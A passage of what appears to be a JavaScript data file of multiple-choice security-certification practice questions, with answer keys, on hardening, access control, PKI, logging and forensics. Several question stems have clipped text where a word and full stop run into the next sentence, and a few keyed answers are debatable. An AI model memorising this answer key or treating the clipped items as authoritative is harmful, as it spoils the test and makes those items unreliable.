        "Susan has been tasked with hardening the systems in her environment and wants to ensure that data cannot be recovered from systems if they are stolen or their disk drives are stolen and accesseWhat is her best option to ensure data security in these situations?",
      incorrectAnswers: [
        "Deploy folder-level encryption.",
        "Deploy file-level encryption.",
        "Degauss all the drives.",
      ],
      correctAnswer: "Deploy full-disk encryption.",
    },
    {
      question:
        "Chloe has noticed that users on her company's network frequently have simple passwords made up of common words. Thus, they have weak passwords. How could Chloe best mitigate this issue?",
      incorrectAnswers: [
        "Increase minimum password length.",
        "Have users change passwords more frequently.",
        "Implement Single Sign-On (SSO).",
      ],
      correctAnswer: "Require password complexity.",
    },
    {
      question:
        "Which Wi-Fi protocol implements simultaneous authentication of equals (SAE) to improve on previous security models?",
      incorrectAnswers: ["WEP", "WPA", "WPA2"],
      correctAnswer: "WPA3",
    },
    {
      question:
        "Megan wants to set up an account that can be issued to visitors. She configures a kiosk application that will allow users in her organization to sponsor the visitor, set the amount of time that the user will be on-site, and then allow them to log into the account, set a password, and use Wi-Fi and other services. What type of account has Megan created?",
      incorrectAnswers: [
        "A user account",
        "A shared account",
        "A service account",
      ],
      correctAnswer: "A guest account",
    },
    {
      question:
        "Henry wants to deploy a web service to his cloud environment for his customers to use. He wants to be able to see what is happening and stop abuse without shutting down the service if customers cause issues. What two things should he implement to allow this?",
      incorrectAnswers: [
        "An API gateway and logging",
        "An API-centric IPS and an API proxy",
        "All of the above",
      ],
      correctAnswer: "API keys and logging via an API gateway",
    },
    {
      question:
        "Patrick has been asked to identify a UTM appliance for his organization. Which of the following capabilities is not a common feature for a UTM device?",
      incorrectAnswers: ["IDS and or IPS", "Antivirus", "DLP"],
      correctAnswer: "MDM",
    },
    {
      question:
        "A companywide policy is being created to define various security levels. Which of the following systems of access control would use documented security levels like Confidential or Secret for information?",
      incorrectAnswers: ["RBAC", "DAC", "BAC"],
      correctAnswer: "MAC",
    },
    {
      question:
        "Gurvinder is reviewing log files for authentication events and notices that one of his users has logged in from a system at his company's home office in Chicago. Less than an hour later, the same user is recorded as logging in from an IP address that geo-IP tools say comes from AustraliWhat type of issue should he flag this as?",
      incorrectAnswers: [
        "A misconfigured IP address",
        "A geo-IP lookup issue",
        "None of the above",
      ],
      correctAnswer: "An impossible travel time, risky login issue",
    },
    {
      question:
        "Users in your network are able to assign permissions to their own shared resources. Which of the following access control models is used in your network?",
      incorrectAnswers: ["RBAC", "MAC", "ABAC"],
      correctAnswer: "DAC",
    },
    {
      question:
        "Cynthia is preparing a new server for deployment and her process includes turning off unnecessary services, setting security settings to match her organization's baseline configurations, and installing patches and updates. What is this process known as?",
      incorrectAnswers: [
        "Security uplift",
        "Configuration management",
        "Endpoint lockdown",
      ],
      correctAnswer: "OS hardening",
    },
    {
      question:
        "John is performing a port scan of a network as part of a security audit. He notices that the domain controller is using secure LDAP. Which of the following ports would lead him to that conclusion?",
      incorrectAnswers: ["53", "389", "443"],
      correctAnswer: "636",
    },
    {
      question:
        "Chris wants to securely generate and store cryptographic keys for his organization's servers, while also providing the ability to offload TLS encryption processing. What type of solution should he recommend?",
      incorrectAnswers: [
        "A GPU in cryptographic acceleration mode",
        "A TPM",
        "A CPU in cryptographic acceleration mode",
      ],
      correctAnswer: "A HSM",
    },
    {
      question:
        "Tracy wants to protect desktop and laptop systems in her organization from network attacks. She wants to deploy a tool that can actively stop attacks based on signatures, heuristics, and anomalies. What type of tool should she deploy?",
      incorrectAnswers: ["A firewall", "Antimalware", "HIDS"],
      correctAnswer: "HIPS",
    },
    {
      question:
        "Which of the following access control methods grants permissions based on the user's position in the organization?",
      incorrectAnswers: ["MAC", "DAC", "ABAC"],
      correctAnswer: "RBAC",
    },
    {
      question: "What does UEFI measured boot do?",
      incorrectAnswers: [
        "Records how long it takes for a system to boot up",
        "Compares the hash of every component that is loaded against a known hash stored in the TPM",
        "Checks for updated versions of the UEFI, and compares it to the current version; if it is measured as being too far out of date, it updates the UEFI",
      ],
      correctAnswer:
        "Records information about each component that is loaded, stores it in the TPM, and can report it to a server",
    },
    {
      question: "Kerberos uses which of the following to issue tickets?",
      incorrectAnswers: [
        "Authentication service",
        "Certificate authority",
        "Ticket-granting service",
      ],
      correctAnswer: "Key distribution center",
    },
    {
      question:
        "Maria wants to ensure that her wireless controller and access points are as secure as possible from attack via her network. What control should she put in place to protect them from brute-force password attacks and similar attempts to take over her wireless network's hardware infrastructure?",
      incorrectAnswers: [
        "Regularly patch the devices.",
        "Disable administrative access.",
        "All of the above",
      ],
      correctAnswer:
        "Put the access points and controllers on a separate management VLAN.",
    },
    {
      question:
        "Marcus wants to check on the status of carrier unlocking for all mobile phones owned by and deployed by his company. What method is the most effective way to do this?",
      incorrectAnswers: [
        "Use an MDM tool.",
        "Use a UEM tool.",
        "None of the above; carrier unlock must be verified manually on the phone.",
      ],
      correctAnswer: "Contact the cellular provider.",
    },
    {
      question:
        "Michael wants to implement a zero-trust network. Which of the following steps is not a common step in establishing a zero trust network?",
      incorrectAnswers: [
        "Use strong identity and access management.",
        "Configure firewalls for least privilege and application awareness.",
        "Log security events and analyze them.",
      ],
      correctAnswer: "Simplify the network.",
    },
    {
      question:
        "Samantha is looking for an authentication method that incorporates the X.509 standard and will allow authentication to be digitally signeWhich of the following authentication methods would best meet these requirements?",
      incorrectAnswers: ["OAuth", "Kerberos", "Smartcards"],
      correctAnswer: "Certificate-based authentication",
    },
    {
      question:
        "Your company relies heavily on cloud and SaaS service providers such as salesforce.com, Office365, and Google. Which of the following would you have security concerns about?",
      incorrectAnswers: ["LDAP", "TACACS", "Transitive trust"],
      correctAnswer: "SAML",
    },
    {
      question: "What is the primary difference between MDM and UEM?",
      incorrectAnswers: [
        "MDM does not include patch management.",
        "UEM does not include support for mobile devices.",
        "MDM patches domain machines, not enterprise machines.",
      ],
      correctAnswer: "UEM supports a broader range of devices.",
    },
    {
      question:
        "Kathleen wants to implement a zero-trust network design and knows that she should segment the network. She remains worried about east/west traffic inside the network segments. What is the first security tool she should implement to ensure hosts remain secure from network threats?",
      incorrectAnswers: ["Antivirus", "Host-based IPS", "FDE"],
      correctAnswer: "Host-based firewalls",
    },
    {
      question:
        "Gary is designing his cloud infrastructure and needs to provide a firewall-like capability for the virtual systems he is running. Which of the following cloud capabilities acts like a virtual firewall?",
      incorrectAnswers: [
        "Dynamic resource allocation",
        "VPC endpoints",
        "Instance awareness",
      ],
      correctAnswer: "Security groups",
    },
    {
      question:
        "Derek has enabled automatic updates for the Windows systems that are used in the small business he works for. What hardening process will still need to be tackled for those systems if he wants a complete patch management system?",
      incorrectAnswers: [
        "Automated installation of Windows patches",
        "Windows Update regression testing",
        "Registry hardening",
      ],
      correctAnswer: "Third-party software and firmware patching",
    },
    {
      question:
        "Theresa implements a network-based IDS. What can she do to traffic that passes through the IDS?",
      incorrectAnswers: [
        "Review the traffic based on rules and detect and stop traffic based on those rules.",
        "Detect sensitive data being sent to the outside world and encrypt it as it passes through the IDS.",
        "All of the above",
      ],
      correctAnswer:
        "Review the traffic based on rules and detect and alert about unwanted or undesirable traffic.",
    },
    {
      question:
        "Murali is building his organization's container security best practices document and wants to ensure that he covers the most common items for container security. Which of the following is not a specific concern for containers?",
      incorrectAnswers: [
        "The security of the container host",
        "Securing the management stack for the container",
        "Monitoring network traffic to and from the containers for threats and attacks",
      ],
      correctAnswer: "Insider threats",
    },
    {
      question:
        "Gary's organization uses a NAT gateway at its network edge. What security benefit does a NAT gateway provide?",
      incorrectAnswers: [
        "It statefully blocks traffic based on port and protocol as a type of firewall.",
        "It can detect malicious traffic and stop it from passing through.",
        "It allows non-IP-based addresses to be used behind a legitimate IP address.",
      ],
      correctAnswer:
        "It allows systems to connect to another network without being directly exposed to it.",
    },
    {
      question:
        "Henry is an employee at Acme Company. The company requires him to change his password every three months. He has trouble remembering new passwords, so he keeps switching between just two passwords. Which policy would be most effective in preventing this?",
      incorrectAnswers: [
        "Password complexity",
        "Password length",
        "Multifactor authentication",
      ],
      correctAnswer: "Password history",
    },
    {
      question:
        'Tracy wants to limit when users can log in to a standalone Windows workstation. What can Tracy do to make sure that an account called "visitor" can only log in between 8 a.m. and 5 p.m. every weekday?',
      incorrectAnswers: [
        "Running the command netreg user visitor -daily -working-hours",
        "Running the command login limit:daily time: 8-5",
        "This cannot be done from the Windows command line.",
      ],
      correctAnswer: "Running the command net user visitor /time:M-F,8am-5pm",
    },
    {
      question:
        "Sheila is concerned that some users on her network may be accessing files that they should not-specifically, files that are not required for their job tasks. Which of the following would be most effective in determining if this is happening?",
      incorrectAnswers: [
        "Permissions auditing and review",
        "Account maintenance",
        "Policy review",
      ],
      correctAnswer: "Usage auditing and review",
    },
    {
      question:
        "In which of the following scenarios would using a shared account pose the least security risk?",
      incorrectAnswers: [
        "For a group of tech support personnel",
        "For students logging in at a university",
        "For accounts with few privileges",
      ],
      correctAnswer: "For guest Wi-Fi access",
    },
    {
      question:
        "Mike's manager has asked him to verify that the certificate chain for their production website is valiWhat has she asked Mike to validate?",
      incorrectAnswers: [
        "That the certificate has not been revoked",
        "That the encryption used to create the certificate is strong and has not been cracked",
        "That the certificate was issued properly and that prior certificates issued for the same system have also been issued properly",
      ],
      correctAnswer:
        "That users who visit the website can verify that the site and the CAs in the chain are all trustworthy",
    },
    {
      question:
        "Maria is responsible for security at a small company. She is concerned about unauthorized devices being connected to the network. She is looking for a device authentication process. Which of the following would be the best choice for her?",
      incorrectAnswers: ["CHAP", "Kerberos", "802.11i"],
      correctAnswer: "802.1X",
    },
    {
      question:
        "Which wireless standard uses CCMP to provide encryption for network traffic?",
      incorrectAnswers: ["WEP", "Infrared", "Bluetooth"],
      correctAnswer: "WPA2",
    },
    {
      question:
        "Charles is a CISO for an insurance company. He recently read about an attack wherein an attacker was able to enumerate all the network devices in an organization. All this was done by sending queries using a single protocol. Which protocol should Charles secure to mitigate this attack?",
      incorrectAnswers: ["POP3", "DHCP", "IMAP"],
      correctAnswer: "SNMP",
    },
    {
      question:
        "Magnus is concerned about someone using a password cracker on computers in his company. He is concerned that crackers will attempt common passwords in order to log in to a system. Which of the following would be best for mitigating this threat?",
      incorrectAnswers: [
        "Password age restrictions",
        "Password minimum length requirements",
        "Account usage auditing",
      ],
      correctAnswer: "Account lockout policies",
    },
    {
      question:
        "Lucas is looking for an XML-based open standard for exchanging authentication information. Which of the following would best meet his needs?",
      incorrectAnswers: ["OAuth", "RADIUS", "NTLM"],
      correctAnswer: "SAML",
    },
    {
      question:
        "Joshua is looking for an authentication protocol that would be effective at stopping session hijacking. Which of the following would be his best choice?",
      incorrectAnswers: ["PAP", "TACACS", "RADIUS"],
      correctAnswer: "CHAP",
    },
    {
      question:
        "Greg's company has a remote location that uses an IP-based streaming security camera system. How could Greg ensure that the remote location's networked devices can be managed as if they are local devices and that the traffic to that remote location is secure?",
      incorrectAnswers: [
        "An as-needed TLS VPN",
        "An always-on TLS VPN",
        "An as-needed IPSec VPN",
      ],
      correctAnswer: "An always-on IPSec VPN",
    },
    {
      question: "What does the OPAL standard specify?",
      incorrectAnswers: [
        "Online personal access licenses",
        "The origin of personal accounts and libraries",
        "Drive sanitization modes for degaussers",
      ],
      correctAnswer: "Self-encrypting drives",
    },
    {
      question:
        "What does Unified Extensible Firmware Interface (UEFI) Secure Boot do?",
      incorrectAnswers: [
        "It protects against worms during the boot process.",
        "It validates the system BIOS version.",
        "All of the above",
      ],
      correctAnswer:
        "It validates a signature for each binary loaded during boot.",
    },
    {
      question:
        "Derek is trying to select an authentication method for his company. He needs one that will work with a broad range of services like those provided by Microsoft and Google so that users can bring their own identities. Which of the following would be his best choice?",
      incorrectAnswers: ["Shibboleth", "RADIUS", "OAuth"],
      correctAnswer: "OpenID Connect",
    },
    {
      question:
        "Jason is considering deploying a network intrusion prevention system (IPS) and wants to be able to detect advanced persistent threats. What type of IPS detection method is most likely to detect the behaviors of an APT after it has gathered baseline information about normal operations?",
      incorrectAnswers: [
        "Signature-based IPS detections",
        "Heuristic-based IPS detections",
        "Malicious tool hash IPS detections",
      ],
      correctAnswer: "Anomaly-based IPS detections",
    },
    {
      question:
        "What component is most often used as the foundation for a hardware root of trust for a modern PC?",
      incorrectAnswers: ["The CPU", "A HSM", "The hard drive or SSD"],
      correctAnswer: "A TPM",
    },
    {
      question:
        "Dennis wants to deploy a firewall that can provide URL filtering. What type of firewall should he deploy?",
      incorrectAnswers: [
        "A packet filter",
        "A stateful packet inspection firewall",
        "None of the above",
      ],
      correctAnswer: "A next-generation firewall",
    },
    {
      question:
        "Waleed's organization uses a combination of internally developed and commercial applications that they deploy to mobile devices used by staff throughout the company. What type of tool can he use to handle a combination of bring-your-own-device phones and corporate tablets that need to have these applications loaded onto them and removed from them when their users are no longer part of the organization?",
      incorrectAnswers: ["MOM", "MLM", "MIM"],
      correctAnswer: "MAM",
    },
    {
      question:
        "Charlene is preparing a report on the most common application security issues for cloud applications. Which of the following is not a major concern for cloud applications?",
      incorrectAnswers: [
        "Misconfiguration of the application",
        "Insecure APIs",
        "Account compromise",
      ],
      correctAnswer: "Local machine access leading to compromise",
    },
    {
      question:
        "The CA that Samantha is responsible for is kept physically isolated and is never connected to a network. When certificates are issued, they are generated then manually transferred via removable mediWhat type of CA is this, and why would Samantha's organization run a CA in this mode?",
      incorrectAnswers: [
        "An online CA; it is faster to generate and provide certificates.",
        "An offline CA; it is faster to generate and provide certificates.",
        "An online CA; it prevents potential exposure of the CA's root certificate.",
      ],
      correctAnswer:
        "An offline CA; it prevents potential exposure of the CA's root certificate.",
    },
    {
      question:
        "Susan has configured a virtual private network (VPN) so that traffic destined for systems on her corporate network is routed over the VPN but traffic sent to other destinations is sent out via the VPN user's local network. What is this configuration called?",
      incorrectAnswers: ["Half-pipe", "Full-tunnel", "Split horizon"],
      correctAnswer: "Split-tunnel",
    },
    {
      question:
        "Adam has experienced problems with users plugging in cables between switches on his network, which results in multiple paths to the same destinations being available to systems on the network. When this occurs, the network experiences broadcast storms, causing network outages. What network configuration setting should he enable on his switches to prevent this?",
      incorrectAnswers: ["Storm watch", "Sticky ports", "Port inspection"],
      correctAnswer: "Loop protection",
    },
    {
      question:
        "Charles is concerned that users of Android devices in his company are delaying OTA updates. Why would Charles be concerned about this, and what should he do about it?",
      incorrectAnswers: [
        "OTA updates patch applications, and a NAC agent would report on all phones in the organization.",
        "OTA updates update device encryption keys and are necessary for security, and a PKI would track encryption certificates and keys.",
        "OTA updates are sent by phones to report on online activity and tracking, and an MDM tool receives OTA updates to monitor phones",
      ],
      correctAnswer:
        "OTA updates patch firmware and updates phone configurations, and an MDM tool would provide reports on firmware versions and phone settings",
    },
    {
      question:
        "Ben is preparing to implement a firewall for his network and is considering whether to implement an open source firewall or a proprietary commercial firewall. Which of the following is not an advantage of an open source firewall?",
      incorrectAnswers: [
        "Lower cost",
        "Community code validation",
        "Speed of acquisition",
      ],
      correctAnswer: "Maintenance and support",
    },
    {
      question:
        "Barbara wants to implement WPA3 Personal. Which of the following features is a major security improvement in WPA3 over WPA2?",
      incorrectAnswers: [
        "DDoS monitoring and prevention",
        "Per-channel security",
        "Improvements from 64-bit to 128-bit encryption",
      ],
      correctAnswer: "Brute-force attack prevention",
    },
    {
      question:
        "Isaac wants to implement mandatory access controls on an Android-based device. What can he do to accomplish this?",
      incorrectAnswers: [
        "Run Android in single-user mode.",
        "Change the Android registry to MAC mode.",
        "Install MACDroid.",
      ],
      correctAnswer: "Use SEAndroid.",
    },
    {
      question:
        "Greg has implemented a system that allows users to access accounts like administrator and root without knowing the actual passwords for the accounts. When users attempt to use elevated accounts, their request is compared to policies that determine if the request should be alloweThe system generates a new password each time a trusted user requests access, and then logs the access request. What type of system has Greg implemented?",
      incorrectAnswers: ["A MAC system", "A FDE system", "A TLS system"],
      correctAnswer: "A PAM system",
    },
    {
      question:
        "Alaina has issued Android tablets to staff in her production facility, but cameras are banned due to sensitive data in the building. What type of tool can she use to control camera use on all of her organization's corporate devices that she issues?",
      incorrectAnswers: ["DLP", "OPAL", "MMC"],
      correctAnswer: "MDM",
    },
    {
      question:
        "Olivia wants to enforce a wide variety of settings for devices used in her organization. Which of the following methods should she select if she needs to manage hundreds of devices while setting rules for use of SMS and MMS, audio and video recording, GPS tagging, and wireless connection methods like tethering and hotspot modes?",
      incorrectAnswers: [
        "Use baseline settings automatically set for every phone before it is deployed using an imaging tool.",
        "Require users to configure their phones using a lockdown guide.",
        "Use a CASB tool to manage the devices.",
      ],
      correctAnswer: "Use a UEM tool and application to manage the devices.",
    },
    {
      question:
        "John wants to deploy a solution that will provide content filtering for web applications, CASB functionality, DLP, and threat protection. What type of solution can he deploy to provide these features?",
      incorrectAnswers: [
        "A reverse proxy",
        "A VPC gateway",
        "A next-gen firewall",
      ],
      correctAnswer: "An NG SWG",
    },
    {
      question:
        "Brian wants to limit access to a federated service that uses Single Sign-On based on user attributes and group membership, as well as which federation member the user is logging in from. Which of the following options is best suited to his needs?",
      incorrectAnswers: ["Geolocation", "Account auditing", "Time-based logins"],
      correctAnswer: "Access policies",
    },
    {
      question:
        "Sharif uses the chmod command in Linux to set the permissions to a file using the command chmod 700 example.txt. What permission has he set on the file?",
      incorrectAnswers: [
        "All users have write access to the file.",
        "All users have execute access to the file.",
        "The user has execute access to the file.",
      ],
      correctAnswer: "The user has full access to the file.",
    },
    {
      question:
        "Patrick regularly connects to untrusted networks when he travels and is concerned that an on-path attack could be executed against him as he browses websites. He would like to validate certificates against known certificates for those websites. What technique can he use to do this?",
      incorrectAnswers: [
        "Check the CRL.",
        "Compare his private key to their public key.",
        "Compare their private key to their public key.",
      ],
      correctAnswer: "Use certificate pinning.",
    },
    {
      question:
        "What is the most common format for certificates issued by certificate authorities?",
      incorrectAnswers: ["DER", "PFX", "P7B"],
      correctAnswer: "PEM",
    },
    {
      question:
        "Michelle's organization uses self-signed certificates throughout its internal infrastructure. After a compromise, Michelle needs to revoke one of the self-signed certificates. How can she do that?",
      incorrectAnswers: [
        "Contact the certificate authority and request that they revoke the certificate.",
        "Add the certificate to the CRL.",
        "Reissue the certificate, causing the old version to be invalidated.",
      ],
      correctAnswer:
        "Remove the certificate from the list of whitelisted certificates from each machine that trusts it.",
    },
    {
      question:
        "Which of the following is not a common way to validate control over a domain for a domain-validated X.509 certificate?",
      incorrectAnswers: [
        "Changing the DNS TXT record",
        "Responding to an email sent to a contact in the domain's WHOIS information",
        "Publishing a nonce provided by the certificate authority as part of the domain information",
      ],
      correctAnswer: "Changing the IP addresses associated with the domain",
    },
    {
      question:
        "Fiona knows that SNMPv3 provides additional security features that previous versions of SNMP did not. Which of the following is not a security feature provided by SNMPv3?",
      incorrectAnswers: [
        "Message integrity",
        "Message authentication",
        "Message confidentiality",
      ],
      correctAnswer: "SQL injection prevention",
    },
  ];
  
  const sectionFour = [
    {
      question:
        "Mila wants to generate a unique digital fingerprint for a file, and needs to choose between a checksum and a hash. Which option should she choose and why should she choose it?",
      incorrectAnswers: [
        "A checksum, because it verifies the contents of the file",
        "A hash, because it can be reversed to validate the file",
        "A checksum, because it is less prone to collisions than a hash",
      ],
      correctAnswer: "A hash, because it is unique to the file",
    },
    {
      question:
        "Which of the following would prevent a user from installing a program on a company-owned mobile device?",
      incorrectAnswers: ["A deny list", "ACL", "HIDS"],
      correctAnswer: "An allow list",
    },
    {
      question:
        "Liam is responsible for monitoring security events in his company. He wants to see how diverse events may connect using his security information and event management (SIEM). He is interested in identifying different indicators of compromise that may point to the same breach. Which of the following would be most helpful for him to implement?",
      incorrectAnswers: ["NIDS", "PKI", "A trend dashboard"],
      correctAnswer: "A correlation dashboard",
    },
    {
      question:
        "Emily wants to capture HTTPS packets using tcpdump. If the service is running on its default port and her Ethernet adapter is eth0, which tcpdump command should she use?",
      incorrectAnswers: [
        "tcpdump eth0 -proto https",
        "tcpdump -i eth0 -proto https",
        "tcpdump tcp https eth",
      ],
      correctAnswer: "tcpdump -i eth0 tcp port 443",
    },
    {
      question:
        "Mila gives her team a scenario, and then asks them questions about how they would respond, what issues they expect they might encounter, and how they would handle those issues. What type of exercise has she conducted?",
      incorrectAnswers: ["A walk-through", "A simulation", "A drill"],
      correctAnswer: "A tabletop exercise",
    },
    {
      question:
        "Murali is preparing to acquire data from various devices and systems that are targets in a forensic investigation. Which of the following devices is the least volatile according to the order of volatility?",
      incorrectAnswers: ["CPU cache", "Local disk", "RAM"],
      correctAnswer: "Backups",
    },
    {
      question:
        "Henry has been asked for vulnerability scan results by an incident responder. He is curious to know why the responder needs scan results. What answer would you provide to him to explain why scan results are needed and are useful?",
      incorrectAnswers: [
        "The scans will show the programs the attackers used.",
        "The scans will show the versions of software installed before the attack.",
        "The scans will show where firewalls and other network devices were in place to help with incident analysis.",
      ],
      correctAnswer:
        "Vulnerable services will provide clues about what the attackers may have targeted.",
    },
    {
      question:
        "Nick is reviewing commands run on a Windows 10 system and discovers that the route command was run with the -p flag. What occurred?",
      incorrectAnswers: [
        "Routes were discovered using a ping command.",
        "The route's path will be displayed.",
        "A route was added that will use the path listed in the command.",
      ],
      correctAnswer: "A route was added that will persist between boots.",
    },
    {
      question:
        "Lucca wants to acquire open source intelligence information using an automated tool that can leverage search engines and tools like Shodan. Which of the following tools should he select?",
      incorrectAnswers: ["curl", "hping", "netcat"],
      correctAnswer: "theHarvester",
    },
    {
      question:
        "Brent wants to use a tool to help him analyze malware and attacks and wants to cover a broad range of tactics and tools that are used by adversaries. Which of the following is broadly implemented in technical tools and covers techniques and tactics without requiring a specific order of operations?",
      incorrectAnswers: [
        "The Diamond Model of Intrusion Analysis",
        "The Cyber Kill Chain",
        "The CVSS standard",
      ],
      correctAnswer: "The MITRE ATT&CK framework",
    },
    {
      question:
        "Ted needs to preserve a server for forensic purposes. Which of the following should he not do?",
      incorrectAnswers: [
        "Turn the system off to ensure that data does not change.",
        "Remove the drive while the system is running to ensure that data does not change.",
        "Leave the machine connected to the network so that users can continue to use it.",
      ],
      correctAnswer: "All of the above",
    },
    {
      question:
        "What mitigation technique is used to limit the ability of an attack to continue while keeping systems and services online?",
      incorrectAnswers: ["Segmentation", "Isolation", "Nuking"],
      correctAnswer: "Containment",
    },
    {
      question:
        "Jessica wants to review the network traffic that her Windows system has sent to determine if a file containing sensitive data was uploaded from the system. What Windows log file can she use to find this information?",
      incorrectAnswers: [
        "The application log",
        "The network log",
        "The security log",
      ],
      correctAnswer: "None of the above",
    },
    {
      question:
        "What term is used to describe the documentation trail for control, analysis, transfer, and final disposition of evidence for digital forensic work?",
      incorrectAnswers: ["Evidence log", "Paper trail", "Digital footprint"],
      correctAnswer: "Chain of custody",
    },
    {
      question:
        "Henry wants to determine what services are on a network that he is assessing. Which of the following tools will provide him with a list of services, ports, and their status?",
      incorrectAnswers: ["route", "hping", "netstat"],
      correctAnswer: "nmap",
    },
    {
      question:
        "Nathan needs to know how many times an event occurred and wants to check a log file for that event. Which of the following grep commands will tell him how many times the event happened if each occurrence is logged independently in the logfile.txt log file, and uses a unique event ID: event101?",
      incorrectAnswers: [
        "grep logfile.txt -n 'event101",
        "grep logfile.txt -c 'event101",
        "grep -c event101 -i logfile.txt",
      ],
      correctAnswer: "grep -c 'event101' logfile.txt",
    },
    {
      question:
        "Jacob wants to ensure that all of the areas that are impacted by an incident are addressed by his incident response team. What term is used to describe the relationship and communications process that teams use to ensure that all of those involved are treated appropriately?",
      incorrectAnswers: ["COOP", "PAM", "Communications planning"],
      correctAnswer: "Stakeholder management",
    },
    {
      question:
        "While Susan is conducting a forensic review of logs from two servers hosted in the same datacenter, she notices that log items on the first server occurred exactly an hour before matching events on the second server. What is the most likely cause of such exact occurrences?",
      incorrectAnswers: [
        "The attack took an hour to complete, providing the attacker with access to the second machine an hour later.",
        "The log entries are incorrect, causing the events to appear at the wrong time.",
        "The attacker used a script causing events to happen exactly an hour apart.",
      ],
      correctAnswer:
        "A time offset is causing the events to appear to occur at different times.",
    },
    {
      question:
        "What is the primary usage of Domain Name System (DNS) data in incident investigations and operational security monitoring?",
      incorrectAnswers: [
        "DNS data is used to capture network scans.",
        "DNS data can be used to identify domain transfer attacks.",
        "DNS log information can be used to identify unauthorized logins.",
      ],
      correctAnswer:
        "DNS log information can be used to identify malware going to known malicious sites.",
    },
    {
      question:
        "Theresa wants to view the last 10 lines of a log file and to see it change as modifications are made. What command should she run on the Linux system she is logged in to?",
      incorrectAnswers: [
        "head -f -end 10 logfile.log",
        "foot -watch -l 10 logfile.log",
        "follow -tail 10 logfile.log",
      ],
      correctAnswer: "tail -f logfile.log",
    },
    {
      question:
        "Henry wants to acquire the firmware from a running system. What is the most likely technique that he will need to use to acquire the firmware?",
      incorrectAnswers: [
        "Connect using a serial cable.",
        "Acquire the firmware from disk using disk forensic tools.",
        "None of the above",
      ],
      correctAnswer:
        "Acquire the firmware from memory using memory forensics tools.",
    },
    {
      question:
        "Eric wants to determine how much bandwidth was used during a compromise and where the traffic was directed to. What technology can he implement before the event to help him see this detail and allow him to have an effective bandwidth monitoring solution?",
      incorrectAnswers: ["A firewall", "packetflow", "A DLP"],
      correctAnswer: "NetFlow",
    },
    {
      question:
        "Naomi has acquired an image of a drive as part of a forensic process. She wants to ensure that the drive image matches the original. What should she create and record to validate this?",
      incorrectAnswers: [
        "A third image to compare to the original and new image",
        "A directory listing to show that the directories match",
        "A photographic image of the two drives to show that they match",
      ],
      correctAnswer: "A hash of the drives to show that their hashes match",
    },
    {
      question:
        "Ryan has been asked to run Nessus on his network. What type of tool has he been asked to run?",
      incorrectAnswers: ["A fuzzer", "A WAF", "A protocol analyzer"],
      correctAnswer: "A vulnerability scanner",
    },
    {
      question:
        "Jason wants to ensure that the digital evidence he is collecting during his forensic investigation is admissible. Which of the following is a common requirement for admissibility of evidence?",
      incorrectAnswers: [
        "It must be hearsay.",
        "It must be timely.",
        "It must be public.",
      ],
      correctAnswer: "It must be relevant.",
    },
    {
      question:
        "Which of the following key elements is not typically included in the design of a communication plan?",
      incorrectAnswers: [
        "Incident severity",
        "Customer impact",
        "Employee impact",
      ],
      correctAnswer: "Cost to the organization",
    },
    {
      question:
        "Rick runs the following command cat file1.txt file2.txt What will occur?",
      incorrectAnswers: [
        "The contents of file1.txt will be appended to file2.txt.",
        "The contents of file2.txt will be appended to file1.txt.",
        "The contents of both files will be combined line by line.",
      ],
      correctAnswer:
        "The contents of file1.txt will be displayed, and then the contents of file2 will be displayed.",
    },
    {
      question:
        "Michelle wants to check for authentication failures on a CentOS Linux-based system. Where should she look for these event logs?",
      incorrectAnswers: ["/var/log/auth.log", "/var/log/fail", "/var/log/events"],
      correctAnswer: "/var/log/secure",
    },
    {
      question:
        "A web page's title is considered what type of information about the page?",
      incorrectAnswers: ["Summary", "Header data", "Hidden data"],
      correctAnswer: "Metadata",
    },
    {
      question:
        "Nelson has discovered malware on one of the systems he is responsible for and wants to test it in a safe environment. Which of the following tools is best suited to that testing?",
      incorrectAnswers: ["strings", "scanless", "Sn1per"],
      correctAnswer: "Cuckoo",
    },
    {
      question:
        "Lucca wants to view metadata for a file so that he can determine the author of the file. What tool should he use from the following list?",
      incorrectAnswers: ["Autopsy", "strings", "grep"],
      correctAnswer: "exiftool",
    },
    {
      question:
        "Isaac wants to acquire an image of a system that includes the operating system. What tool can he use on a Windows system that can also capture live memory?",
      incorrectAnswers: ["dd", "Autopsy", "WinDump"],
      correctAnswer: "FTK Imager",
    },
    {
      question:
        "Jason is conducting a forensic investigation and has retrieved artifacts in addition to drives and files. What should he do to document the artifacts he has acquired?",
      incorrectAnswers: [
        "Image them using dd and ensure that a valid MD5sum is generated.",
        "Contact law enforcement to properly handle the artifacts.",
        "Engage legal counsel to advise him how to handle artifacts in an investigation.",
      ],
      correctAnswer:
        "Take a picture of them, label them, and add them to the chain of custody documentation.",
    },
    {
      question:
        "Gary wants to check for the mail servers for example.com. What tool and command can he use to determine this?",
      incorrectAnswers: [
        "ping -email example.com",
        "smtp -mx example.com",
        "email -lookup -mx example.com",
      ],
      correctAnswer: "nslookup -query =mx example.com",
    },
    {
      question:
        "Which of the following is best suited to analyzing live SIP traffic?",
      incorrectAnswers: ["Log files", "Nessus", "SIPper"],
      correctAnswer: "Wireshark",
    },
    {
      question:
        "Andrea wants to identify services on a remote machine and wants the services to be labeled with service names and other common details. Which of the following tools will not provide that information?",
      incorrectAnswers: ["Sn1per", "Nessus", "nmap"],
      correctAnswer: "netcat",
    },
    {
      question:
        "Joseph is writing a forensic report and wants to be sure he includes appropriate detail. Which of the following would not typically be included while discussing analysis of a system?",
      incorrectAnswers: [
        "Validation of the system clock's time settings",
        "The operating system in use",
        "The methods used to create the image",
      ],
      correctAnswer: "A picture of the person from whom the system was taken",
    },
    {
      question:
        "Greg believes an attacker has been using a brute-force password attack against a Linux system he is responsible for. What command could he use to determine if this is the case?",
      incorrectAnswers: [
        "tail /etc/bruteforce.log",
        "head /etc/bruteforce.log",
        'grep "Failed login" /etc/log/auth.log',
      ],
      correctAnswer: 'grep "Failed password" /var/log/auth.log',
    },
    {
      question:
        "Elaine wants to determine what websites a user has recently visited using the contents of a forensically acquired hard drive. Which of the following locations would not be useful for her investigation?",
      incorrectAnswers: [
        "The browser cache",
        "The browser history",
        "Session data",
      ],
      correctAnswer: "The browser's bookmarks",
    },
    {
      question:
        "Jason wants to acquire network forensic datWhat tool should he use to gather this information?",
      incorrectAnswers: ["nmap", "Nessus", "SNMP"],
      correctAnswer: "Wireshark",
    },
    {
      question:
        "Ananth has been told that attackers sometimes use ping to map networks. What information returned by ping could be most effectively used to determine network topology?",
      incorrectAnswers: ["Packets sent", "Packets received", "Transit time"],
      correctAnswer: "TTL",
    },
    {
      question:
